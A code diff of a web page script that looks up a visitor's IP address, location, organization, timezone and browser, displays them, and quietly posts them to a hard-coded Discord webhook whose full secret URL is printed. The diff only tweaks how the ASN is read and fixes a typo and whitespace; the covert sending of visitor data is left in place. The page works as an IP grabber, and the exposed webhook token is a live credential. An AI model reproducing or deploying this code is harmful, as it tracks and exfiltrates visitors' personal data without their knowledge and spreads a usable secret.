@@ -47,7 +47,7 @@
                 document.getElementById('ip').textContent = `IP: ${data.ip}`;
                 document.getElementById('location').textContent = `Location: ${data.city}, ${data.region}, ${data.country}`;
                 document.getElementById('org').textContent = `Organization: ${data.org}`;
-                document.getElementById('asn').textContent = `ASN: ${data.asn}`;
+                document.getElementById('asn').textContent = `ASN: ${data.org.split(' ')[0]}`; // Extract ASN from the org field
                 document.getElementById('timezone').textContent = `Timezone: ${data.timezone}`;
 
                 // Get and display browser info
@@ -57,7 +57,7 @@
                 // Send IP info to Discord webhook
                 const webhookUrl = 'https://discord.com/api/webhooks/1248388329033175151/46egZimtPEcNCFuCnTuVuHQtINNBPeIfh6Ii40RRsqfvv_XsBx-reszhdcj4MzFa_K_x';
                 const message = {
-                    content: `New visitor IP information:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nASN: ${data.asn}\nTimezone: ${data.timezone}\nBrowser: ${browserInfo}`
+                    content: `New visitor IP information:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nASN: ${data.org.split(' ')[0]}\nTimezone: ${data.timezone}\nBrowser: ${browserInfo}`
                 };
 
                 await fetch(webhookUrl, {
@@ -67,16 +67,16 @@
                     },
                     body: JSON.stringify(message)
                 });
-                
+
             } catch (error) {
-                document.getElementById('ip-info').textContent = 'Looks like youve ran into an error.';
+                document.getElementById('ip-info').textContent = 'Looks like youve run into an error.';
             }
         }
 
         function getBrowserInfo() {
             const userAgent = navigator.userAgent;
             let browserName = "Unknown";
-            
+
             if (userAgent.match(/chrome|chromium|crios/i)) {
                 browserName = "Chrome";
             } else if (userAgent.match(/firefox|fxios/i)) {
@@ -90,7 +90,7 @@
             } else if (userAgent.match(/msie|trident/i)) {
                 browserName = "Internet Explorer";
             }
-            
+
             return browserName + ' ' + navigator.appVersion;
         }
 
